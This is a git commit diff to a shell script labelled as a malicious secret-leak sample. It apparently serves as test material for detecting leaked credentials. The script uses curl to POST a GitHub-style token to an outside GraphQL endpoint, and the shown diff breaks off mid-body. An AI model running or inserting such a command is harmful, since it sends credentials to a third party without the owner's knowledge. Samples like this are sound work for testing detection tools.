a64048fe531f315fcfcc8ce5465312a0401cba64
Pranesh-Shrestha <pranesh.shrestha@tekvortex.com>
2025-04-28 15:21:54 +0545

    Update secret_leak.sh

--- malicious_scripts/secret_leak.sh
+++ malicious_scripts/secret_leak.sh
@@ -1,4 +1,7 @@
 #!/bin/bash
 
 # Sending a POST request with a GitHub token (LEAK)
-curl "https://api.veribom.com/graphql?GH=ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+curl -X POST https://api.veribom.com/graphql \
+   -H "Content-Type: application/json" \
+   -d '{
+     "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
